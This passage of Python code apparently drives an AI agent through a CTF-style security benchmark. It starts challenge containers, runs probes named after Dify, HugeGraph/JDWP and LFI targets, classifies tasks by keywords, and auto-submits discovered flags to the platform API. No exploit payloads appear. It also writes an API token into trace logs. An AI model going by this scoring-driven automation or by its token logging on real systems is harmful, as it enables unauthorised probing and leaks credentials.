            payloads.extend(self._benchmark_string_tuple(raw.get("payloads"), limit=40))
        return payloads

    def _benchmark_builtin_service_action_profiles(self) -> dict[str, dict[str, Any]]:
        return {
            "dify": {
                "label": "Dify",
                "probe": self._benchmark_probe_dify_local,
                "actions": {
                    "handoff": {
                        "reasoning_reason": (
                            "Dify/Next.js 专项静态/API 探测完成，需选择一个最高置信利用假设"
                        ),
                        "summary": (
                            "已对当前题 {code} 执行 bounded Dify/Next.js 静态 chunk、"
                            "RSC、public/console API、install/signin 探测；未直接发现 flag，"
                            "保留 active 给 exploit step。"
                        ),
                    },
                    "exploit": {
                        "abandon_reason": "Dify bounded exploit 未发现可提交 flag",
                        "summary": (
                            "{code} 已完成 bounded Dify/Next.js 复核，未发现 flag/可提交候选；"
                            "为最大化总分，标记 abandoned，下一步 close 换题。"
                        ),
                    },
                    "close": {},
                },
            },
            "hugegraph": {
                "label": "HugeGraph",
                "probe": self._benchmark_probe_hugegraph_local,
                "actions": {
                    "exploit": {
                        "abandon_reason": "HugeGraph/JDWP bounded exploit 未发现可提交 flag",
                        "summary": (
                            "{code} 已完成 bounded HugeGraph/Gremlin/Arthas/JDWP 探测，"
                            "未发现 flag/可提交候选；为最大化总分，标记 abandoned，下一步 close 换题。"
                        ),
                    },
                    "close": {},
                },
            },
        }

    def _benchmark_normalize_service_action_profile(
        self,
        raw: Any,
    ) -> tuple[str, dict[str, Any]] | None:
        if not isinstance(raw, dict):
            return None
        fingerprint = str(raw.get("fingerprint") or "").strip().lower()
        if not _re_mod.fullmatch(r"[a-z0-9_.-]{1,80}", fingerprint):
            return None
        profile: dict[str, Any] = {}
        label = str(raw.get("label") or fingerprint).strip()
        if label:
            profile["label"] = label[:80]
        probe_key = str(raw.get("probe_key") or "").strip().lower()
        probe = self._benchmark_service_probe_registry().get(probe_key)
        if callable(probe):
            profile["probe"] = probe
        raw_actions = raw.get("actions")
        if not isinstance(raw_actions, dict):
            return None
        actions: dict[str, dict[str, str]] = {}
        for action in ("handoff", "exploit", "close"):
            raw_action = raw_actions.get(action)
            if raw_action is True:
                actions[action] = {}
                continue
            if not isinstance(raw_action, dict):
                continue
            action_profile: dict[str, str] = {}
            for key in ("reasoning_reason", "abandon_reason", "summary"):
                value = str(raw_action.get(key) or "").strip()
                if value:
                    action_profile[key] = value[:800]
            actions[action] = action_profile
        if not actions:
            return None
        profile["actions"] = actions
        return fingerprint, profile

    def _benchmark_external_service_action_profiles(self) -> dict[str, dict[str, Any]]:
        data = self._benchmark_external_profiles()
        raw_profiles = data.get("service_action_profiles", data.get("action_profiles", []))
        if not isinstance(raw_profiles, list):
            return {}
        profiles: dict[str, dict[str, Any]] = {}
        for raw in raw_profiles[:40]:
            normalized = self._benchmark_normalize_service_action_profile(raw)
            if normalized is None:
                continue
            fingerprint, profile = normalized
            profiles[fingerprint] = profile
        return profiles

    def _benchmark_service_action_profiles(self) -> dict[str, dict[str, Any]]:
        profiles = {
            key: dict(value)
            for key, value in self._benchmark_builtin_service_action_profiles().items()
        }
        for fingerprint, external in self._benchmark_external_service_action_profiles().items():
            merged = dict(profiles.get(fingerprint, {}))
            if "actions" in merged and "actions" in external:
                actions = dict(merged.get("actions") or {})
                for action, action_profile in (external.get("actions") or {}).items():
                    action_merged = dict(actions.get(action) or {})
                    action_merged.update(action_profile)
                    actions[action] = action_merged
                merged["actions"] = actions
            external_without_actions = {
                key: value for key, value in external.items() if key != "actions"
            }
            merged.update(external_without_actions)
            if "actions" in external and "actions" not in merged:
                merged["actions"] = external["actions"]
            profiles[fingerprint] = merged
        return profiles

    def _benchmark_service_action_from_desc(self, desc: str) -> tuple[str, str] | None:
        lowered = desc.lower()
        for fingerprint, profile in self._benchmark_service_action_profiles().items():
            if f"benchmark {fingerprint}" not in lowered:
                continue
            actions = profile.get("actions") or {}
            if "handoff step 1" in lowered and "handoff" in actions:
                return fingerprint, "handoff"
            if "exploit step 2" in lowered and "exploit" in actions:
                return fingerprint, "exploit"
            if "close step 3" in lowered and "close" in actions:
                return fingerprint, "close"
        return None

    def _benchmark_profiled_service_fingerprints(self) -> set[str]:
        return (
            set(self._benchmark_service_action_profiles())
            | set(self._benchmark_service_handoff_profiles())
        )

    def _benchmark_fingerprint_has_profiled_handoff(self, fingerprint: Any) -> bool:
        return isinstance(fingerprint, str) and fingerprint in self._benchmark_profiled_service_fingerprints()

    def _benchmark_run_service_action_step(
        self,
        fingerprint: str,
        action: str,
    ) -> str:
        profile = self._benchmark_service_action_profiles()[fingerprint]
        label = str(profile.get("label") or fingerprint)
        code, addrs = self._benchmark_active_challenge_from_state()
        if not code:
            verb = action if action != "handoff" else "handoff"
            return f"确定性 {label} {verb}：当前没有 active 容器，跳过。"
        action_profile = dict((profile.get("actions") or {}).get(action) or {})
        if action == "close":
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            closed = self._benchmark_close_local(code)
            if code in completed:
                return f"确定性 {label} close：{code} 已完成，close 返回: {closed[:200]}"
            return f"确定性 {label} close：{code} 已 close 释放资源: {closed[:300]}"

        if not addrs:
            return f"确定性 {label} {action}：当前 active 容器无地址，跳过。"
        addr = addrs[0]
        if not _re_mod.fullmatch(r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}", addr):
            return f"确定性 {label} {action}：容器地址格式异常: {addr}"
        base = f"http://{addr}/"
        self._benchmark_set_service_fingerprint(code, fingerprint)
        probe_func = profile.get("probe")
        if callable(probe_func):
            probe = str(probe_func(code, base, ""))
        else:
            probe = self._benchmark_probe_handoff_followup_local(code, addrs)
        with self._benchmark_state_lock:
            completed = set(self._benchmark_state.get("completed_challenges", set()))
        if code in completed:
            closed = self._benchmark_close_local(code)
            return (
                f"确定性 {label} {action}：{code} 已提交成功并关闭。\n"
                f"close 返回: {closed[:200]}\n探测摘要:\n{probe[:3000]}"
            )
        if action == "handoff":
            self._benchmark_mark_reasoning_needed(
                code,
                str(action_profile.get("reasoning_reason") or f"{label} handoff 需要服务专项深挖"),
            )
        else:
            self._benchmark_mark_abandoned(
                code,
                str(action_profile.get("abandon_reason") or f"{label} bounded exploit 未发现 flag"),
            )
        summary = str(action_profile.get("summary") or "{code} 已完成 bounded 探测。").format(
            code=code
        )
        return (
            f"确定性 {label} {action}：{summary}\n"
            f"探测摘要:\n{probe[:3500]}"
        )

    def _benchmark_deterministic_fast_step(self, desc: str, reason: str = "") -> str | None:
        """Run the policy fast path without an LLM when the step is mechanical."""
        if not self._is_benchmark_aggressive():
            return None
        service_action = self._benchmark_service_action_from_desc(desc)
        if service_action:
            fingerprint, action = service_action
            return self._benchmark_run_service_action_step(fingerprint, action)
        if "Benchmark handoff step 1" in desc:
            code, addrs = self._benchmark_active_challenge_from_state()
            if not code:
                return "确定性 handoff：当前没有 active 容器，跳过。"
            probe = self._benchmark_probe_container_local(code, addrs)
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                closed = self._benchmark_close_local(code)
                return (
                    f"确定性 handoff：{code} 已提交成功并关闭。\n"
                    f"close 返回: {closed[:200]}\n探测摘要:\n{probe[:3000]}"
                )
            return (
                f"确定性 handoff：已围绕当前题 {code} 执行登录态/LFI/源码派生探测，"
                "未直接发现 flag；保留给 step 2 做一个高置信后续假设。\n"
                f"探测摘要:\n{probe[:3500]}"
            )
        if "Benchmark handoff step 2" in desc:
            code, addrs = self._benchmark_active_challenge_from_state()
            if not code:
                return "确定性 handoff：当前没有 active 容器，跳过。"
            with self._benchmark_state_lock:
                fingerprints = dict(self._benchmark_state.get("service_fingerprints", {}))
            if self._benchmark_fingerprint_has_profiled_handoff(fingerprints.get(code)):
                return None
            probe = self._benchmark_probe_handoff_followup_local(code, addrs)
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                closed = self._benchmark_close_local(code)
                return (
                    f"确定性 handoff：{code} 后续假设提交成功并关闭。\n"
                    f"close 返回: {closed[:200]}\n探测摘要:\n{probe[:3000]}"
                )
            if any(
                marker in probe.lower()
                for marker in ("hugegraph", "gremlin", "arthas", "jdwp")
            ):
                self._benchmark_mark_reasoning_needed(
                    code,
                    "服务专项线索仍有利用空间，禁止按普通 Web 低收益题关闭",
                )
                return (
                    f"确定性 handoff：{code} 发现/确认服务专项线索，"
                    "保留 active 给四柱继续深挖，不标记 abandoned。\n"
                    f"探测摘要:\n{probe[:3000]}"
                )
            self._benchmark_mark_abandoned(code, "handoff 高置信后续假设无 flag")
            return (
                f"确定性 handoff：{code} 后续高置信假设未发现 flag。\n"
                "已标记为 abandoned，下一轮应先 close 释放容器。\n"
                f"探测摘要:\n{probe[:3000]}"
            )
        if "Benchmark handoff step 3" in desc:
            code, _addrs = self._benchmark_active_challenge_from_state()
            if not code:
                return "确定性 handoff：当前没有 active 容器，无需 close。"
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
                reasoning = set(self._benchmark_state.get("reasoning_challenges", set()))
                abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
            if code in completed:
                closed = self._benchmark_close_local(code)
                return f"确定性 handoff：{code} 已完成，close 返回: {closed[:200]}"
            if code in reasoning and code not in abandoned:
                return (
                    f"确定性 handoff：{code} 仍处于 reasoning 状态且未被判定低收益，"
                    "跳过机械 close，保留 active 给四柱/runner 继续服务专项利用。"
                )
            closed = self._benchmark_close_local(code)
            return f"确定性 handoff：{code} 无直接突破，已 close 释放资源: {closed[:300]}"
        if "Benchmark fast setup" in desc:
            notes: list[str] = []
            detected = self._benchmark_detect_tun_local()
            if detected:
                notes.append(f"复用已连接 VPN：{detected[0]} {detected[1]}")
            else:
                notes.append(self._benchmark_start_vpn_local())
                detected = self._benchmark_detect_tun_local()
            with self._benchmark_state_lock:
                if not self._benchmark_state.get("api_interface"):
                    self._benchmark_state["api_interface"] = "enp0s20f0u3u4"
            try:
                challenges = self._benchmark_list_challenges_local()
                notes.append(f"平台 API 校验成功，题目数={len(challenges)}")
            except Exception as exc:
                notes.append(f"平台 API 校验失败: {exc}")
            self._persist_benchmark_state()
            return "确定性 setup：" + "；".join(notes)

        if "Benchmark fast step 1" in desc:
            challenges = self._benchmark_list_challenges_local()
            if not challenges:
                return "确定性调度：平台已返回终止状态或无题目列表。"
            cleanup_results = self._benchmark_close_completed_active_from_snapshot(challenges)
            cleanup_note = ""
            if cleanup_results:
                cleanup_note = "确定性调度：先关闭已完成 active 容器释放名额: " + " | ".join(cleanup_results)
                challenges = self._benchmark_list_challenges_local()
            active_items = [
                item for item in challenges
                if self._benchmark_is_active_status(item)
                and item.get("is_completed") is not True
            ]
            with self._benchmark_state_lock:
                abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
            for item in active_items:
                code = item.get("unique_code")
                if isinstance(code, str) and code in abandoned:
                    closed = self._benchmark_close_local(code)
                    return f"确定性调度：先关闭 stale 当前题 {code}: {closed[:200]}"
            if active_items:
                code = active_items[0].get("unique_code")
                addrs = active_items[0].get("container_addr") or []
                active_msg = f"确定性调度：继续当前 active 题 {code} => {addrs}"
                return f"{cleanup_note}\n{active_msg}" if cleanup_note else active_msg
            next_item = self._benchmark_select_next_candidate(challenges)
            if next_item is None:
                no_candidate_msg = (
                    "确定性调度：未发现未完成 stopped 候选，后续应刷新平台状态或等待资源。"
                )
                return (
                    f"{cleanup_note}\n{no_candidate_msg}"
                    if cleanup_note
                    else no_candidate_msg
                )
            code = str(next_item["unique_code"])
            difficulty = str(next_item.get("difficulty") or "unknown").lower()
            started = self._benchmark_start_local(code)
            if "max active challenge instances reached" in started.lower():
                refreshed = self._benchmark_list_challenges_local()
                retry_cleanup = self._benchmark_close_completed_active_from_snapshot(refreshed)
                if retry_cleanup:
                    challenges = self._benchmark_list_challenges_local()
                    retry_item = next(
                        (
                            item
                            for item in challenges
                            if item.get("unique_code") == code
                            and item.get("is_completed") is not True
                            and self._benchmark_is_startable_status(item)
                        ),
                        None,
                    )
                    if retry_item is not None:
                        retry_started = self._benchmark_start_local(code)
                        retry_msg = (
                            f"确定性调度：start 遇到 active 名额满，已关闭完成题释放名额: "
                            f"{' | '.join(retry_cleanup)}；重试启动 {code} ({difficulty}): "
                            f"{retry_started[:300]}"
                        )
                        return f"{cleanup_note}\n{retry_msg}" if cleanup_note else retry_msg
                blocked_msg = (
                    f"确定性调度：启动下一道 {difficulty} {code} 失败，"
                    "active 名额已满且未发现可清理的已完成容器；"
                    "不要放弃该题，下一步应 close stale active 或刷新状态。"
                )
                return f"{cleanup_note}\n{blocked_msg}" if cleanup_note else blocked_msg
            start_msg = f"确定性调度：启动下一道 {difficulty} {code}: {started[:300]}"
            return f"{cleanup_note}\n{start_msg}" if cleanup_note else start_msg

        if "Benchmark fast step 2" in desc:
            code, addrs = self._benchmark_active_challenge_from_state()
            if not code or not addrs:
                refreshed_code, refreshed_addrs = self._benchmark_refresh_active_challenge_from_platform()
                if refreshed_code:
                    code, addrs = refreshed_code, refreshed_addrs
            if not code:
                return "确定性探测：当前没有 active 容器，跳过。"
            if not addrs:
                return (
                    f"确定性探测：{code} 平台显示 active 但没有 container_addr，"
                    "本轮只刷新状态，不 start 新题。"
                )
            with self._benchmark_state_lock:
                abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
            if code in abandoned:
                closed = self._benchmark_close_local(code)
                return f"确定性探测：{code} 已 stale，直接 close: {closed[:200]}"
            probe = self._benchmark_probe_container_local(code, addrs)
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                self._benchmark_clear_probe_unreachable(code)
                closed = self._benchmark_close_local(code)
                return (
                    f"确定性探测：{code} 已提交成功并关闭。"
                    f"触发原因: {reason or 'fast path'}\n"
                    f"close 返回: {closed[:200]}\n"
                    f"探测摘要:\n{probe[:2500]}"
                )
            if self._benchmark_probe_looks_unreachable(probe):
                streak = self._benchmark_note_probe_unreachable(code)
                retry_limit = self._benchmark_unreachable_retry_limit()
                if streak < retry_limit:
                    return (
                        f"确定性探测：{code} 容器暂不可达（第 {streak} 次），"
                        f"保留 active，下一轮重试 readiness/probe，不 start 新题（阈值 {retry_limit}）。"
                        f"触发原因: {reason or 'fast path'}\n"
                        f"探测摘要:\n{probe[:2500]}"
                    )
                closed = self._benchmark_close_local(code)
                return (
                    f"确定性探测：{code} 连续 {streak} 次不可达，已关闭止损。"
                    f"触发原因: {reason or 'fast path'}\n"
                    f"close 返回: {closed[:200]}\n"
                    f"探测摘要:\n{probe[:2500]}"
                )
            with self._benchmark_state_lock:
                abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
                reasoning = set(self._benchmark_state.get("reasoning_challenges", set()))
                fingerprints = dict(self._benchmark_state.get("service_fingerprints", {}))
            if code in abandoned:
                closed = self._benchmark_close_local(code)
                fingerprint = fingerprints.get(code)
                service_note = f"（服务指纹 {fingerprint}）" if fingerprint else ""
                return (
                    f"确定性探测：{code} 已由 bounded service profile 判定低收益{service_note}，"
                    "已 close 释放资源。\n"
                    f"触发原因: {reason or 'fast path'}\n"
                    f"close 返回: {closed[:200]}\n"
                    f"探测摘要:\n{probe[:2500]}"
                )
            if code in reasoning:
                fingerprint = fingerprints.get(code)
                service_note = f"（服务指纹 {fingerprint}）" if fingerprint else ""
                return (
                    f"确定性探测：{code} 已由 service profile 标记为需要深挖{service_note}，"
                    "保留 active 并切回四柱/runner；本轮不 close、不 start 新题。"
                    f"触发原因: {reason or 'fast path'}\n"
                    f"探测摘要:\n{probe[:2500]}"
                )
            self._benchmark_mark_reasoning_needed(
                code,
                "fast path 已获取可达响应/协议线索但未直接发现 flag",
            )
            return (
                f"确定性探测：{code} 已获取有效响应但未直接发现 flag，"
                "保留 active 并切回四柱/runner 深挖；本轮不 close、不 start 新题。"
                f"触发原因: {reason or 'fast path'}\n"
                f"探测摘要:\n{probe[:2500]}"
            )
        return None

    def _benchmark_deterministic_standard_task(self, desc: str) -> str | None:
        if not self._is_benchmark_aggressive() or "Benchmark " in desc:
            return None
        classification = self._benchmark_classify_standard_task(desc)
        if classification == "setup":
            state_context = self._benchmark_state_context()
            return (
                "确定性标准任务：Benchmark setup 已由 fast path 校验，"
                "直接复用当前运行态；不再重复慢速读取/搜索配置。\n"
                f"{state_context[:1200]}"
            )
        if classification == "probe":
            return self._benchmark_deterministic_fast_step(
                "Benchmark fast step 2：只解当前已启动的 10.x 容器。",
                reason="standard_mechanical_probe",
            )
        if classification == "schedule":
            return self._benchmark_deterministic_fast_step(
                "Benchmark fast step 1：只做调度。",
                reason="standard_mechanical_schedule",
            )
        return None

    @staticmethod
    def _benchmark_standard_task_rules() -> list[dict[str, Any]]:
        return [
            {
                "kind": "setup",
                "any": ("challenges_api", "api文档", "vpn配置"),
                "any_original": ("读取", "获取"),
            },
            {
                "kind": "probe",
                "any_original": ("快速指纹", "寻找flag", "尝试提交"),
            },
            {
                "kind": "probe",
                "any": ("obvious flag", "post submit"),
            },
            {
                "kind": "probe",
                "all": ("submit",),
                "any": ("flag", "close"),
            },
            {
                "kind": "probe",
                "any_original": ("探测",),
                "any_original_2": ("容器", "10.x"),
            },
            {
                "kind": "schedule",
                "any_original": ("列出",),
                "any_original_2": ("题目",),
            },
            {
                "kind": "schedule",
                "any_original": ("题目列表",),
                "any_original_2": ("获取", "筛选", "刷新", "解析"),
            },
            {
                "kind": "schedule",
                "any_original": ("挑战列表",),
                "any_original_2": ("获取", "调用", "确定"),
            },
            {
                "kind": "schedule",
                "any_original": ("可做",),
                "any_original_2": ("题目", "挑战"),
            },
            {
                "kind": "schedule",
                "all": ("list接口",),
                "any_original": ("题目",),
            },
            {
                "kind": "schedule",
                "all": ("list api",),
                "any_original": ("解析", "排序", "排除", "题目"),
            },
            {
                "kind": "schedule",
                "all": ("list接口",),
                "any": ("easy",),
            },
            {
                "kind": "schedule",
                "all": ("平台api",),
                "any_original": ("挑战列表", "题目"),
            },
            {
                "kind": "schedule",
                "any_original": ("筛选",),
                "any": ("easy", "低level"),
            },
            {
                "kind": "schedule",
                "all": ("post start",),
                "any_original": ("题",),
            },
            {
                "kind": "schedule",
                "all": ("post start",),
                "any": ("easy",),
            },
            {
                "kind": "schedule",
                "all": ("start",),
                "any_original": ("重新", "下一个", "下一道", "未完成"),
                "any_original_2": ("题", "容器"),
            },
            {
                "kind": "schedule",
                "all": ("start api",),
                "any_original": ("选中", "未完成", "第一道", "启动"),
            },
            {
                "kind": "schedule",
                "any_original": ("排序", "排除已完成", "解析"),
                "any": ("stopped", "easy", "level"),
            },
            {
                "kind": "schedule",
                "any_original": ("选择一道",),
                "any": ("easy", "低level"),
            },
            {
                "kind": "schedule",
                "any_original": ("启动",),
                "any_original_2": ("容器",),
            },
            {
                "kind": "schedule",
                "any_original": ("启动",),
                "any_original_2": ("题",),
                "any": ("easy", "低level"),
            },
            {
                "kind": "schedule",
                "all": ("start接口",),
                "any_original": ("启动",),
            },
            {
                "kind": "schedule",
                "any_original": ("下一道",),
                "any_original_2": ("题",),
            },
        ]

    @classmethod
    def _benchmark_classify_standard_task(cls, desc: str) -> str | None:
        lowered = desc.lower()
        for rule in cls._benchmark_standard_task_rules():
            if not all(token in lowered for token in rule.get("all", ())):
                continue
            if not all(token in desc for token in rule.get("all_original", ())):
                continue
            if rule.get("any") and not any(token in lowered for token in rule["any"]):
                continue
            if rule.get("any_original") and not any(
                token in desc for token in rule["any_original"]
            ):
                continue
            if rule.get("any_original_2") and not any(
                token in desc for token in rule["any_original_2"]
            ):
                continue
            return str(rule["kind"])
        return None

    def _benchmark_active_submit_code(self, evidence: str = "") -> str | None:
        with self._benchmark_state_lock:
            completed = set(self._benchmark_state.get("completed_challenges", set()))
            closed = set(self._benchmark_state.get("closed_challenges", set()))
            active = dict(self._benchmark_state.get("active_containers", {}))
            current = self._benchmark_state.get("current_challenge")
        excluded = completed | closed
        if isinstance(current, str) and current and current not in excluded:
            return current
        if evidence:
            matched_codes: list[str] = []
            for code, addrs in active.items():
                if not isinstance(code, str) or code in excluded:
                    continue
                for addr in addrs or []:
                    if not isinstance(addr, str) or not addr:
                        continue
                    host = addr.split(":", 1)[0]
                    if addr in evidence or f"http://{addr}" in evidence or host in evidence:
                        matched_codes.append(code)
                        break
            matched_codes = list(dict.fromkeys(matched_codes))
            if len(matched_codes) == 1:
                return matched_codes[0]
        active_candidates = [
            code for code in active
            if isinstance(code, str) and code not in excluded
        ]
        if len(active_candidates) == 1:
            return active_candidates[0]
        return None

    def _benchmark_auto_submit_flags_from_tool_result(self, content: str) -> None:
        """Submit flags immediately when a container tool output exposes one.

        This is intentionally outside the model loop: if the subtask times out
        after discovering a flag, the score is still claimed before close/switch.
        """
        if not self._is_benchmark_aggressive() or not content:
            return
        command = self._extract_command_from_tool_result(content)
        output = self._extract_output_from_tool_result(content)
        lowered_command = command.lower()
        if (
            "/openapi/v1/challenges" in lowered_command
            or "challenges_api.md" in lowered_command
            or ".events.jsonl" in lowered_command
        ):
            return
        if "10." not in command and "http://10." not in output and "https://10." not in output:
            return
        flags = _re_mod.findall(
            r"\b(?:flag|ctf|tsec)\{[^}\s]{4,}\}",
            output,
            flags=_re_mod.IGNORECASE,
        )
        if not flags:
            return
        code = self._benchmark_active_submit_code(f"{command}\n{output}")
        if not code:
            self._record_trace(
                "benchmark_auto_submit_skipped",
                detail="工具输出包含 flag，但无法唯一确定当前 active unique_code。",
                metadata={"flags": flags[:3]},
            )
            return
        api_config = self._benchmark_api_config_from_workspace()
        if api_config is None:
            self._record_trace(
                "benchmark_auto_submit_skipped",
                detail="工具输出包含 flag，但无法读取 CHALLENGES_API.md 中的 API 配置。",
                metadata={"challenge": code},
            )
            return
        base_url, token = api_config
        with self._benchmark_state_lock:
            submitted = set(self._benchmark_state.get("auto_submitted_flags", set()))
            api_interface = self._benchmark_state.get("api_interface") or "enp0s20f0u3u4"

        for flag in dict.fromkeys(flags):
            submit_key = f"{code}:{flag}"
            if submit_key in submitted:
                continue
            body = json.dumps(
                {"unique_code": code, "flag": flag},
                ensure_ascii=False,
                separators=(",", ":"),
            )
            cmd = [
                "curl",
                "-sS",
                "--interface",
                str(api_interface),
                "--connect-timeout",
                "10",
                "--max-time",
                "20",
                "-X",
                "POST",
                f"{base_url}/openapi/v1/challenges/submit",
                "-H",
                f"BENCHMARK_TOKEN: {token}",
                "-H",
                "Content-Type: application/json",
                "-d",
                body,
            ]
            try:
                result = subprocess.run(
                    cmd,
                    check=False,
                    text=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=30,
                )
            except Exception as exc:
                self._record_trace(
                    "benchmark_auto_submit_failed",
                    detail=f"{code} 自动提交 flag 失败：{exc}",
                    metadata={"challenge": code},
                )
                continue

            with self._benchmark_state_lock:
                submitted = set(self._benchmark_state.get("auto_submitted_flags", set()))
                submitted.add(submit_key)
                self._benchmark_state["auto_submitted_flags"] = submitted

            synthetic_content = (
                f"命令: curl --interface {api_interface} "
                "-X POST "
                f"{base_url}/openapi/v1/challenges/submit "
                f"-H 'BENCHMARK_TOKEN: {token}' "
                f"-d '{body}'\n"
                "工作目录: /home/my/cyber/benchmark_test\n"
                f"退出码: {result.returncode}\n"
                "输出:\n"
                f"{result.stdout}"
            )
            self._record_trace(
                "benchmark_auto_submit",
                detail=f"{code} 自动提交工具输出中的 flag，返回码 {result.returncode}。",
                metadata={
                    "challenge": code,
                    "stdout": result.stdout[:500],
                    "stderr": result.stderr[:500],
                },
            )
            self._update_benchmark_runtime_state(synthetic_content)
            if result.returncode == 0 and (
                '"correct":true' in result.stdout.lower()
                or '"duplicate"' in result.stdout.lower()
                or '"code":"duplicate"' in result.stdout.lower()
            ):
                break

    @staticmethod
    def _extract_command_from_tool_result(content: str) -> str:
        match = _re_mod.search(r"命令:\s*(.*?)\n工作目录:", content, _re_mod.DOTALL)
        return match.group(1).strip() if match else ""

    @staticmethod
    def _extract_output_from_tool_result(content: str) -> str:
        match = _re_mod.search(r"\n输出:\n(.*)$", content, _re_mod.DOTALL)
        return match.group(1).strip() if match else content

    @staticmethod
    def _iter_json_fragments(text: str) -> list[Any]:
        decoder = json.JSONDecoder()
        results: list[Any] = []
        for idx, char in enumerate(text):
            if char not in "[{":
                continue
            try:
                value, _ = decoder.raw_decode(text[idx:])
            except Exception:
                continue
            results.append(value)
        return results

    def _update_benchmark_runtime_state(self, content: str) -> None:
        if not self._is_benchmark_aggressive() or not content:
            return

        command = self._extract_command_from_tool_result(content)
        output = self._extract_output_from_tool_result(content)
        combined = f"{command}\n{output}"
        lowered = combined.lower()
        command_lowered = command.lower()
        is_platform_challenges_command = "/openapi/v1/challenges" in command_lowered
        is_platform_list_command = (
            is_platform_challenges_command
            and "/openapi/v1/challenges/" not in command_lowered
            and "|" not in command
            and ">" not in command
        )
        is_platform_submit_command = (
            is_platform_challenges_command and "/openapi/v1/challenges/submit" in command_lowered
        )
        updates: dict[str, Any] = {}

        tun_match = _re_mod.search(
            r"\b(tun\d+):[\s\S]{0,240}?\binet\s+([0-9.]+)/\d+",
            combined,
        )
        if tun_match:
            updates["vpn_connected"] = True
            updates["tun_interface"] = tun_match.group(1)
            updates["tun_ip"] = tun_match.group(2)

        vpn_config = _re_mod.search(r"openvpn\s+--config\s+([^\s]+\.ovpn)", command)
        if vpn_config:
            updates["vpn_config"] = vpn_config.group(1)

        if (
            "tsecbench.zc.tencent.com" in lowered
            and "/openapi/v1/challenges" in lowered
            and "退出码: 0" in content
            and "invalid_state" not in lowered
            and "task_not_found" not in lowered
        ):
            used_interface = self._command_uses_interface(command)
            if used_interface and not _re_mod.fullmatch(r"tun\d+", used_interface):
                updates["api_interface"] = used_interface

        if is_platform_challenges_command and "invalid_state" in lowered and "finished" in lowered:
            updates["task_finished"] = True

        completed: set[str] = set()
        completed_scores: dict[str, int] = {}
        closed: set[str] = set()
        active_updates: dict[str, list[str]] = {}
        current_challenge: str | None = None
        last_score: int | None = None
        challenges_snapshot: list[dict[str, Any]] | None = None

        json_fragments = self._iter_json_fragments(output) if is_platform_challenges_command else []
        if is_platform_list_command:
            list_fragment = next(
                (
                    value
                    for value in json_fragments
                    if isinstance(value, list)
                    and all(
                        isinstance(item, dict) and "unique_code" in item
                        for item in value
                    )
                ),
                None,
            )
            json_fragments = [list_fragment] if isinstance(list_fragment, list) else []
        for value in json_fragments:
            if isinstance(value, dict):
                code = value.get("unique_code")
                if isinstance(code, str) and code:
                    addrs = value.get("container_addr")
                    if isinstance(addrs, list) and addrs and (
                        self._benchmark_is_active_status(value)
                        or "/challenges/start" in lowered
                    ):
                        active_updates[code] = [str(addr) for addr in addrs]
                        current_challenge = code
                    if value.get("closed") is True:
                        closed.add(code)
                elif value.get("closed") is True:
                    close_code = self._benchmark_extract_unique_code(command)
                    if close_code:
                        closed.add(close_code)

                if value.get("correct") is True:
                    submit_code = self._benchmark_extract_unique_code(command)
                    if submit_code:
                        completed.add(submit_code)
                        current_challenge = submit_code
                    awarded = value.get("awarded")
                    score = value.get("cumulative_score")
                    if isinstance(score, int) and submit_code:
                        completed_scores[submit_code] = score
                    elif isinstance(awarded, int) and submit_code:
                        completed_scores[submit_code] = awarded
                    if isinstance(score, int):
                        last_score = score

                if value.get("is_completed") is True:
                    code = value.get("unique_code")
                    if isinstance(code, str):
                        completed.add(code)
                        total_score = value.get("total_score")
                        if isinstance(total_score, int):
                            completed_scores.setdefault(code, total_score)

            elif isinstance(value, list):
                if is_platform_list_command and value and all(
                    isinstance(item, dict) and "unique_code" in item
                    for item in value
                ):
                    challenges_snapshot = [dict(item) for item in value]
                for item in value:
                    if not isinstance(item, dict):
                        continue
                    code = item.get("unique_code")
                    if not isinstance(code, str):
                        continue
                    if item.get("is_completed") is True:
                        completed.add(code)
                        total_score = item.get("total_score")
                        if isinstance(total_score, int):
                            completed_scores.setdefault(code, total_score)
                    if self._benchmark_is_active_status(item):
                        addrs = item.get("container_addr")
                        if isinstance(addrs, list) and addrs:
                            active_updates[code] = [str(addr) for addr in addrs]
                            current_challenge = code

        if is_platform_challenges_command and not challenges_snapshot:
            for match in _re_mod.finditer(
                r"(?P<code>\b[A-Za-z][A-Za-z0-9]*(?:-[A-Za-z0-9]+)+\b)"
                r"\s*:\s*completed=(?P<completed>true|false)"
                r"\s*,\s*status=(?P<status>[A-Za-z_]+)"
                r"\s*,\s*addr=(?P<addr>\[[^\]\n]{0,500}\])",
                output,
                flags=_re_mod.IGNORECASE,
            ):
                code = match.group("code")
                completed_value = match.group("completed").lower() == "true"
                status = match.group("status").lower()
                addrs = _re_mod.findall(
                    r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}",
                    match.group("addr"),
                )
                if completed_value:
                    completed.add(code)
                    continue
                if status == "available" and addrs:
                    active_updates[code] = [str(addr) for addr in addrs]
                    current_challenge = code

        state_changed = bool(
            updates
            or completed
            or completed_scores
            or closed
            or active_updates
            or challenges_snapshot is not None
            or current_challenge
            or last_score is not None
        )
        if not state_changed:
            return

        with self._benchmark_state_lock:
            self._benchmark_state.update(updates)
            active = dict(self._benchmark_state.get("active_containers", {}))
            active.update(active_updates)
            completed_set = set(self._benchmark_state.get("completed_challenges", set()))
            closed_set = set(self._benchmark_state.get("closed_challenges", set()))
            abandoned_set = set(self._benchmark_state.get("abandoned_challenges", set()))
            recovered_set = set(
                self._benchmark_state.get("recovery_attempted_challenges", set())
            )
            reasoning_set = set(self._benchmark_state.get("reasoning_challenges", set()))
            service_fingerprints = dict(
                self._benchmark_state.get("service_fingerprints", {})
            )
            unreachable_streaks = dict(
                self._benchmark_state.get("probe_unreachable_streaks", {})
            )
            score_map = dict(self._benchmark_state.get("completed_scores", {}))
            completed_set.update(completed)
            closed_set.update(closed)
